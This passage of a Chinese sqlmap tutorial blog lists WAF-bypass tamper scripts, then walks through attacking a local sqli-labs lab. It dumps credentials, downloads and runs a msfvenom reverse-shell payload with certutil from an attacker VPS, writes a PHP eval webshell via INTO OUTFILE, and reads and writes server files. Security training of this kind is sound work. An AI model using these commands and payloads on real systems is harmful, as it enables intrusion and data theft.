用UTF-8全角字符替换&#x27;（例如&#x27;-&gt;％EF％BC％87）                  |</span><br><span class="line">| apostrophenullencode.py      | 用双unicode替换&#x27;（例如&#x27;-&gt;％00％27）                          |</span><br><span class="line">| appendnullbyte.py            | 在payload的末尾附加NULL字节字符（％00）                      |</span><br><span class="line">| base64encode.py              | 对payload中的所有字符进行base64编码                          |</span><br><span class="line">| between.py                   | 用运算符（&#x27;&gt;&#x27;）替换&#x27;NOT BETWEEN 0 AND＃&#x27;，用运算符（&#x27;=&#x27;）替换&#x27;BETWEEN＃AND＃&#x27; |</span><br><span class="line">| bluecoat.py                  | 用随机空白字符替换语句后的空格字符，之后用运算符LIKE替换字符&#x27;=&#x27; |</span><br><span class="line">| chardoubleencode.py          | 对payload中的所有字符进行双重URL编码（例如SELECT-&gt;％2553％2545％254C％2545％2543％2554） |</span><br><span class="line">| charencode.py                | 对payload中所有字符进行URL编码（例如SELECT-&gt;％53％45％4C％45％43％54） |</span><br><span class="line">| charunicodeencode.py         | 对payload中的所有字符进行unicode编码（例如SELECT-&gt;％u0053％u0045％u004C％u0045％u0043％u0054） |</span><br><span class="line">| charunicodeescape.py         | 使用Unicode转义payload中的未编码字符（例如SELECT-&gt;\u0053\u0045\u004C\u0045\u0043\u0054） |</span><br><span class="line">| commalesslimit.py            | 用&#x27;LIMIT N OFFSET M&#x27;替换（MySQL）实例，例如&#x27;LIMIT M，N&#x27;      |</span><br><span class="line">| commalessmid.py              | 用&#x27;MID（A FROM B FOR C）&#x27;替换（MySQL）实例，例如&#x27;MID（A，B，C）&#x27; |</span><br><span class="line">| commentbeforeparentheses.py  | 在括号前加（内联）注释（例如（（-&gt;/**/（）                   |</span><br><span class="line">| concat2concatws.py           | 用&#x27;CONCAT_WS（MID（CHAR（0），0，0），A，B）&#x27;替换（MySQL）实例，例如&#x27;CONCAT（A，B）&#x27; 。 |</span><br><span class="line">| equaltolike.py               | 将（&#x27;=&#x27;）运算符替换为&#x27;LIKE&#x27;                                  |</span><br><span class="line">| escapequotes.py              | 斜杠转义单引号和双引号（例如&#x27;-&gt; \&#x27;）                         |</span><br><span class="line">| great.py                     | 替换运算符（&#x27;&gt;&#x27; ）和&#x27;GREATEST&#x27;对应                           |</span><br><span class="line">| Halfversionedmorekeywords.py | 在每个关键字前添加mysql注释                                  |</span><br><span class="line">| hex2char.py                  | 替换每个（MySQL）0x等效的CONCAT（CHAR（），...）编码字符串   |</span><br><span class="line">| htmlencode.py                | 用HTML编码（使用代码点）所有非字母数字字符（例如&#x27;-&gt;&#x27;）       |</span><br><span class="line">| ifnull2casewhenisnull.py     | 绕过对 IFNULL 过滤,替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’ |</span><br><span class="line">| ifnull2ifisnull.py           | 用&#x27;IF（ISNULL（A），B）替换&#x27;IFNULL（A，B）&#x27;之类的实例，A）&#x27;对应 |</span><br><span class="line">| informationschemacomment.py  | 在所有出现的（MySQL）“information_schema”标识符的末尾添加一个内联注释（/ ** /） |</span><br><span class="line">| least.py                     | 用&#x27;LEAST&#x27;对应替换运算符（&#x27;&gt;&#x27;）                               |</span><br><span class="line">| lowercase.py                 | 用小写替换每个关键字字符（例如SELECT-&gt;select）               |</span><br><span class="line">| luanginx.py                  | LUA-NginxWAF绕过（例如Cloudflare）                           |</span><br><span class="line">| modsecurityversioned.py      | 包含带有（MySQL）版本注释的完整查询                          |</span><br><span class="line">| modsecurityzeroversioned.py  | 包含带有（MySQL）零版本注释的完整查询                        |</span><br><span class="line">| multiplespaces.py            | 在SQL关键字周围添加多个空格（&#x27;&#x27;）                            |</span><br><span class="line">| overlongutf8.py              | 将payload中的所有（非字母数字）字符转换为超长UTF8（例如&#x27;-&gt;％C0％A7） |</span><br><span class="line">| overlongutf8more.py          | 将payload中所有字符转换为超长UTF8（例如SELECT-&gt;％C1％93％C1％85％C1％8C％C1％85％C1％83％C1％94） |</span><br><span class="line">| percent.py                   | 在每个字符前面添加一个百分号（&#x27;％&#x27;） （例如SELECT-&gt;％S％E％L％E％C％T） |</span><br><span class="line">| plus2concat.py               | 替换运算符（&#x27;+&#x27;）与（MsSQL）函数CONCAT（）对应               |</span><br><span class="line">| plus2fnconcat.py             | 用（MsSQL）ODBC函数&#123;fn CONCAT（）&#125;替换为（&#x27;+&#x27;）              |</span><br><span class="line">| randomcase.py                | 用随机大小写值替换每个关键字字符（例如SELECT-&gt; SEleCt）      |</span><br><span class="line">| randomcomments.py            | 在SQL关键字内添加随机内联注释（例如SELECT-&gt; S/**/E/**/LECT） |</span><br><span class="line">| sp_password.py               | 将（MsSQL）函数&#x27;sp_password&#x27;附加到payload的末尾，以便从DBMS日志中自动进行混淆 |</span><br><span class="line">| space2comment.py             | 空格替换为/**_**/                                            |</span><br><span class="line">| space2dash.py                | 空格替换为-加随机字符                                        |</span><br><span class="line">| space2hash.py                | 空格替换为#加随机字符                                        |</span><br><span class="line">| space2morecomment.py         | 空格替换为/**_**/                                            |</span><br><span class="line">| space2morehash.py            | 空格替换为#加随机字符及换行符                                |</span><br><span class="line">| space2mssqlblank.py          | 空格替换为其他空符号（MsSQL）                                |</span><br><span class="line">| space2mssqlhash.py           | 空格替换为%23%0A(MsSQL)                                      |</span><br><span class="line">| space2mysqlblank.py          | 空格替换为其它空符号（Mysql）                                |</span><br><span class="line">| space2mysqldash.py           | 替换空格字符（&#x27;&#x27;）（’–‘）后跟一个破折号注释一个换行（’n’）   |</span><br><span class="line">| space2plus.py                | 用加号（&#x27;+&#x27;）替换空格字符（&#x27;&#x27;）                              |</span><br><span class="line">| space2randomblank.py         | 用空格中的随机空白字符替换空格字符（&#x27;&#x27;）有效的替代字符集     |</span><br><span class="line">| substring2leftright.py       | 用LEFT和RIGHT替换PostgreSQL SUBSTRING                        |</span><br><span class="line">| symbolicologic.py            | 用符号（&amp;&amp;和\|\|）替换AND和OR逻辑运算符                      |</span><br><span class="line">| unionalltounion.py           | 用UNION SELECT替换UNION ALL SELECT                           |</span><br><span class="line">| unmagicquotes.py             | 用多字节组合％BF％27替换引号字符（&#x27;），并在末尾添加通用注释  |</span><br><span class="line">| uppercase.py-                | 用大写值替换每个关键字字符（例如select -&gt; SELECT）           |</span><br><span class="line">| varnish.py                   | 添加HTTP标头&#x27;X-originating-IP&#x27;以绕过Varnish防火墙            |</span><br><span class="line">| versionedkeywords.py         | 用注释封装每个非函数的关键字                                 |</span><br><span class="line">| versionedmorekeywords.py     | 将每个关键字包含（MySQL）版本注释                            |</span><br><span class="line">| versionedmorekeywords.py     | 将每个关键字包含（MySQL）版本注释                            |</span><br><span class="line">| xforwardedfor.py             | 添加伪造的HTTP标头&#x27;X-Forwarded-For                           |</span><br></pre></td></tr></table></figure></div>
+<br/>
+
+<h3 id="Temper自编写"><a href="#Temper自编写" class="headerlink" title="Temper自编写"></a>Temper自编写</h3><p>Sqlmap 支持自编写 temper ，自带例子 base64encode.py</p>
+<div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.convert <span class="keyword">import</span> encodeBase64</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Base64-encodes all characters in a given payload</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&quot;1&#x27; AND SLEEP(5)#&quot;)</span></span><br><span class="line"><span class="string">    &#x27;MScgQU5EIFNMRUVQKDUpIw==&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encodeBase64(payload, binary=<span class="literal">False</span>) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>自定制，将 <code>空格</code> ,替换为 <code>/**/</code>,将 <code>select</code> 替换为 <code>Select</code>, <code>SLEEP</code> 替换为 <code>Sleep</code>,然后将此脚本放置到 sqlmap 的 temper 目录下，然后调用参数 –temper xxx.py 即可</p>
+<div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">	<span class="keyword">return</span> payload.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>).replace(<span class="string">&quot;select&quot;</span>,<span class="string">&quot;Select&quot;</span>).replace(<span class="string">&quot;SLEEP&quot;</span>,<span class="string">&quot;Sleep&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="五、具体利用"><a href="#五、具体利用" class="headerlink" title="五、具体利用"></a>五、具体利用</h2><p>这边利用 sqli-lab 环境作为靶场环境，具体搭建请自行参考网上文章，或者直接 docker pull 一个，这里不再赘述。</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029161848191.png" data-caption="image-20221029161848191"><img src="/../images/sqlmap/image-20221029161848191.png" alt="image-20221029161848191"></a></p>
+<h3 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h3><p>1、直接对url进行探测是否存在漏洞 <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot;</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029161942962.png" data-caption="image-20221029161942962"><img src="/../images/sqlmap/image-20221029161942962.png" alt="image-20221029161942962"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029165027147.png" data-caption="image-20221029165027147"><img src="/../images/sqlmap/image-20221029165027147.png" alt="image-20221029165027147"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029165138414.png" data-caption="image-20221029165138414"><img src="/../images/sqlmap/image-20221029165138414.png" alt="image-20221029165138414"></a></p>
+<p>2、查询其数据库 <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot; --dbs</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029165340377.png" data-caption="image-20221029165340377"><img src="/../images/sqlmap/image-20221029165340377.png" alt="image-20221029165340377"></a></p>
+<p>3、众所周知 sqli-lab 数据库为 security，我们直接查询其数据表 <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot; -D security --tables</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029165559549.png" data-caption="image-20221029165559549"><img src="/../images/sqlmap/image-20221029165559549.png" alt="image-20221029165559549"></a></p>
+<p>4、对数据表中的 users 数据列进行查询 <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot; -D security -T users --columns</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029165819852.png" data-caption="image-20221029165819852"><img src="/../images/sqlmap/image-20221029165819852.png" alt="image-20221029165819852"></a></p>
+<p>5、查询 usermane 数据列中的所有数据，查询到有13个用户名 <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot; -D security -T users -C username --dump</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029170103643.png" data-caption="image-20221029170103643"><img src="/../images/sqlmap/image-20221029170103643.png" alt="image-20221029170103643"></a></p>
+<p>6、继续查询 password 数据列中的数据 <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot; -D security -T users -C password --dump</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029170237202.png" data-caption="image-20221029170237202"><img src="/../images/sqlmap/image-20221029170237202.png" alt="image-20221029170237202"></a></p>
+<p>至此，sqlmap基本的数据查询就已经完成了，可通过查询出来的账号密码进行后台登录，寻找下一个漏洞点深一步测试。</p>
+<h3 id="进阶使用"><a href="#进阶使用" class="headerlink" title="进阶使用"></a>进阶使用</h3><p>在日常的渗透中，有时候因为查询数据时间过长，我们习惯得到注入点后，查询其是否存在 dba 权限，若是 dba 权限则可进一步获取交互 shell。这里主要接扫几种进一步利用方式：–os-shell、–sql-shell、–file-read、–file-write、–file-dest。</p>
+<p>1、查询是否是 dba 权限 <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-1/?id=1&quot; --is-dba</code>，这里显示 DBA：False 则说明不是 DBA权限，则无法进一步利用。</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029170655721.png" data-caption="image-20221029170655721"><img src="/../images/sqlmap/image-20221029170655721.png" alt="image-20221029170655721"></a></p>
+<p>我们更换关卡为第5关，尝试利用 DBA 进一步测试 <code>python sqlmap.py -u &quot;http://192.168.114.144:8001/Less-5/?id=1&quot; --is-dba</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029170833247.png" data-caption="image-20221029170833247"><img src="/../images/sqlmap/image-20221029170833247.png" alt="image-20221029170833247"></a></p>
+<p>DBA：True，证明为 dba 权限</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029170933044.png" data-caption="image-20221029170933044"><img src="/../images/sqlmap/image-20221029170933044.png" alt="image-20221029170933044"></a></p>
+<h4 id="os-shell"><a href="#os-shell" class="headerlink" title="os-shell"></a>os-shell</h4><p>–os-shell，直接获取数据库 shell(相当于获取数据库服务器权限，可进行命令执行）,上传webshell等操作</p>
+<p><strong>利用条件：</strong></p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MySQL root账号权限，即配置MySQL连接的账号为root账号，不是root账号具备root权限也可</span><br><span class="line">GPC配置关闭，能使用单引号</span><br><span class="line">有网站的绝对路径，且具备可以在文件夹写入文件的权限</span><br><span class="line">没有配置secure-file-priv属性</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>1、获取 –os-shell</p>
+<p><code>python sqlmap.py -u &quot;http://www.sqli-labs-funsiooo.com:8001/Less-7/?id=1&quot; --os-shell</code> 默认为 PHP ，可手动选择数字</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029172347308.png" data-caption="image-20221029172347308"><img src="/../images/sqlmap/image-20221029172347308.png" alt="image-20221029172347308"></a></p>
+<p>输入绝对路径，实战中可通过网站报错、信息泄露等手段获取网站路径</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029190033776.png" data-caption="image-20221029190033776"><img src="/../images/sqlmap/image-20221029190033776.png" alt="image-20221029190033776"></a></p>
+<p>环境符合，获取 os-shell</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029190102891.png" data-caption="image-20221029190102891"><img src="/../images/sqlmap/image-20221029190102891.png" alt="image-20221029190102891"></a></p>
+<p>通过 os-shell 可执行系统命令</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029190835758.png" data-caption="image-20221029190835758"><img src="/../images/sqlmap/image-20221029190835758.png" alt="image-20221029190835758"></a></p>
+<p>2、通过 os-shell 上传木马，首先在 VPS 上放置一个木马，通过 os-shell 利用 sqlmap 调用系统 certutil.exe 远程下载木马，然后执行上线，下图为攻击机地址。</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029191222590.png" data-caption="image-20221029191222590"><img src="/../images/sqlmap/image-20221029191222590.png" alt="image-20221029191222590"></a></p>
+<p>生成msf木马</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.130 LPORT=2333 -f exe -o /home/funsiooo/2333.exe</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029191710336.png" data-caption="image-20221029191710336"><img src="/../images/sqlmap/image-20221029191710336.png" alt="image-20221029191710336"></a></p>
+<p>利用 Python 在生成 msf 木马路径下开启临时 web 服务</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029192006003.png" data-caption="image-20221029192006003"><img src="/../images/sqlmap/image-20221029192006003.png" alt="image-20221029192006003"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029192030597.png" data-caption="image-20221029192030597"><img src="/../images/sqlmap/image-20221029192030597.png" alt="image-20221029192030597"></a></p>
+<p>攻击机 msf 处进行监听</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.114.140</span><br><span class="line">lhost =&gt; 192.168.114.140</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 2333</span><br><span class="line">lport =&gt; 2333</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029192650298.png" data-caption="image-20221029192650298"><img src="/../images/sqlmap/image-20221029192650298.png" alt="image-20221029192650298"></a></p>
+<p>在 sqlmap 处调用 windwos 自带的 certutil.exe 远程下载 msf shell，最后通过命令执行 msf shell 反弹shell</p>
+<p>远程下载2333.exe(注意y&#x2F;n&#x2F;a选择)</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt; certutil.exe -urlcache -split -f http://192.168.114.140:8000/2333.exe C:\Users\Public\2333.exe</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029193805046.png" data-caption="image-20221029193805046"><img src="/../images/sqlmap/image-20221029193805046.png" alt="image-20221029193805046"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029193839251.png" data-caption="image-20221029193839251"><img src="/../images/sqlmap/image-20221029193839251.png" alt="image-20221029193839251"></a></p>
+<p>执行 2333.exe 木马程序,获取反弹 msf shell</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt; C:\Users\Public\2333.exe</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029194114549.png" data-caption="image-20221029194114549"><img src="/../images/sqlmap/image-20221029194114549.png" alt="image-20221029194114549"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029194152525.png" data-caption="image-20221029194152525"><img src="/../images/sqlmap/image-20221029194152525.png" alt="image-20221029194152525"></a></p>
+<h4 id="sql-shell"><a href="#sql-shell" class="headerlink" title="sql-shell"></a>sql-shell</h4><p>–sql-shell，数据库交互模式 shell，执行数据库命令，上传shell，注意：该关卡通关需要secure_file_priv属性为空，若为NULL不能写入，具体参数解析或查询方法看后面有解析</p>
+<p>若为NULL，则需要打开phpstudy\MySQL\my.ini文件，在其中加上一句：secure_file_priv&#x3D;”&#x2F;“</p>
+<p><strong>利用条件：</strong></p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写入权限</span><br><span class="line">知道网站绝对路径</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>1、获取 sql-shell <code>python sqlmap.py -u &quot;http://www.sqli-labs-funsiooo.com:8001/Less-7/?id=1&quot; --sql-shell</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029174714532.png" data-caption="image-20221029174714532"><img src="/../images/sqlmap/image-20221029174714532.png" alt="image-20221029174714532"></a></p>
+<p>查询数据库版本 <code>select @@version;</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029174855562.png" data-caption="image-20221029174855562"><img src="/../images/sqlmap/image-20221029174855562.png" alt="image-20221029174855562"></a></p>
+<p>查看目录和 secure_file_priv 属性以及数据库路径和 Mysql 安装路径 <code>select @@secure_file_priv,@@datadir,@@basedir</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029180221656.png" data-caption="image-20221029180221656"><img src="/../images/sqlmap/image-20221029180221656.png" alt="image-20221029180221656"></a></p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># @@secure_file_priv</span><br><span class="line">查看数据库是否有写入、写出、或指定具体路径写入属性，用来限制导出效果。他有三个属性：</span><br><span class="line">1）null限制不能导出</span><br><span class="line">2）为空可以自定义</span><br><span class="line">3）为一个路径则只能导出到指定路径</span><br><span class="line">若上图为C:\\即为空，即可以自定义写入路径</span><br><span class="line"></span><br><span class="line"># @@basedir</span><br><span class="line">该参数指定了安装 MySQL 的安装路径（mysql安装目录）</span><br><span class="line"></span><br><span class="line"># @@datadir 参数</span><br><span class="line">该参数指定MySQL的数据文件的存放目录，数据库文件即我们常说的 MySQL data 文件。</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>为 NULL 不可导出，所以得修改为空才能通过 into file 进行写入，实战中若为 NULL 则不能进一步利用</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029180535990.png" data-caption="image-20221029180535990"><img src="/../images/sqlmap/image-20221029180535990.png" alt="image-20221029180535990"></a></p>
+<p>在 Mysql 文件中的 my.ini 添加 <code>secure_file_priv=&quot;/&quot;</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029184518955.png" data-caption="image-20221029184518955"><img src="/../images/sqlmap/image-20221029184518955.png" alt="image-20221029184518955"></a></p>
+<p>再次探测，<code>@@secure_file_priv</code> 已变为 C:\</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029184439988.png" data-caption="image-20221029184439988"><img src="/../images/sqlmap/image-20221029184439988.png" alt="image-20221029184439988"></a></p>
+<p>通过into outfile 写入 webshell, 注入点闭合语句+回显点+(ox+webshell十六进制)+”网站绝对路径”</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs-funsiooo.com:8001/Less-7/?id=1&#x27;)) union select 1,2,0x3c3f706870206576616c28245f504f53545b2774657374275d293f3e into outfile &quot;C:\\phpstudy_pro\\WWW\\www.sqli-labs-funsiooo.com\\Less-7\\1.php&quot; --+</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029185203640.png" data-caption="image-20221029185203640"><img src="/../images/sqlmap/image-20221029185203640.png" alt="image-20221029185203640"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029213150700.png" data-caption="image-20221029213150700"><img src="/../images/sqlmap/image-20221029213150700.png" alt="image-20221029213150700"></a></p>
+<p>未写入前</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029184722537.png" data-caption="image-20221029184722537"><img src="/../images/sqlmap/image-20221029184722537.png" alt="image-20221029184722537"></a></p>
+<p>写入后</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029185105234.png" data-caption="image-20221029185105234"><img src="/../images/sqlmap/image-20221029185105234.png" alt="image-20221029185105234"></a></p>
+<p>通过蚁剑进行连接</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029185419868.png" data-caption="image-20221029185419868"><img src="/../images/sqlmap/image-20221029185419868.png" alt="image-20221029185419868"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029185554953.png" data-caption="image-20221029185554953"><img src="/../images/sqlmap/image-20221029185554953.png" alt="image-20221029185554953"></a></p>
+<p>sql-shell 中通过以下这条命令，可以查询数据库的用户和密码 <code>sql-shell&gt; select host,user,password from mysql.user</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029185835833.png" data-caption="image-20221029185835833"><img src="/../images/sqlmap/image-20221029185835833.png" alt="image-20221029185835833"></a></p>
+<h4 id="file-read"><a href="#file-read" class="headerlink" title="file-read"></a>file-read</h4><p>当数据库为 MySQL、PostgreSQL 或 SQL Server，并且当前用户有权限时，可以读取指定文件。</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029223918619.png" data-caption="image-20221029223918619"><img src="/../images/sqlmap/image-20221029223918619.png" alt="image-20221029223918619"></a></p>
+<p>执行命令 <code>python sqlmap.py -u &quot;http://www.sqli-labs-funsiooo.com:8001/Less-5/?id=1&quot; --file-read &quot;C:\Users\Public\test.txt&quot;</code> 成功读取，并将文件保存在电脑 <code>C:\Users\Boom\AppData\Local\sqlmap\output\www.sqli-labs-funsiooo.com\files</code> 下</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029224405312.png" data-caption="image-20221029224405312"><img src="/../images/sqlmap/image-20221029224405312.png" alt="image-20221029224405312"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029224443986.png" data-caption="image-20221029224443986"><img src="/../images/sqlmap/image-20221029224443986.png" alt="image-20221029224443986"></a></p>
+<h4 id="file-write、file-dest"><a href="#file-write、file-dest" class="headerlink" title="file-write、file-dest"></a>file-write、file-dest</h4><p>当数据库为MySQL、Postgre SQL或者Sql Server(通过powershell写入)，并且当前用户有权限向任意目录写文件的时候，可以上传文件到数据库服务器。我们可以上传木马进行 getshell</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://www.sqli-labs-funsiooo.com:8001/Less-5/?id=1&quot; --file-write C:\Users\Boom\Desktop\sql_upload\shell.php --file-dest &quot;C:\phpstudy_pro\WWW\www.sqli-labs-funsiooo.com\shell-2.php&quot;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>成功上传</p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029232542537.png" data-caption="image-20221029232542537"><img src="/../images/sqlmap/image-20221029232542537.png" alt="image-20221029232542537"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029232506161.png" data-caption="image-20221029232506161"><img src="/../images/sqlmap/image-20221029232506161.png" alt="image-20221029232506161"></a></p>
+<p>为上传前</p>
